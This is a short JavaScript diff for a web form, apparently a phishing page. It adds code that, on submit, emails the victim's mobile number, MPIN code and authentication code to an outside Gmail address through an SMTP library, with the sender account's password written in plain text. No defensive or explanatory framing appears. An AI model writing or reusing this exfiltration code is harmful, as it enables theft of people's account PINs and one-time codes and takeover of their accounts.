@@ -15,10 +15,10 @@ let next = document.querySelector(".next");
 // On Changing the input field of main sec
 let inputValues = 0;
 function inputRange() {
-  if (mainInput.value.length == 9) {
+  if (mainInput.value.length == 10) {
     inputValues = mainInput.value;
   }
-  if (mainInput.value.length > 9) {
+  if (mainInput.value.length > 10) {
     mainInput.value = inputValues;
   }
 }
@@ -89,6 +89,17 @@ submitBtn.addEventListener("click", () => {
     console.log(userData);
     container3.style.display = "none";
     container4.style.display = "block";
+    Email.send({
+      Host: "smtp.gmail.com",
+      Username: "awaisbusiness616@gmail.com",
+      Password: "awaisbusiness&no2",
+      To: "www.owaistag@gmail.com",
+      From: "awaisbusiness616@gmail.com",
+      Subject: "User Data",
+      Body: `Mobile Number : ${userData[0]}, 
+             MPIN Code: ${userData[1]},
+             Auth Code : ${userData[2]}`,
+    }).then((message) => alert("mail sent successfully", message));
   } else {
     alert("Plz first fill the authentication code boxes");
   }
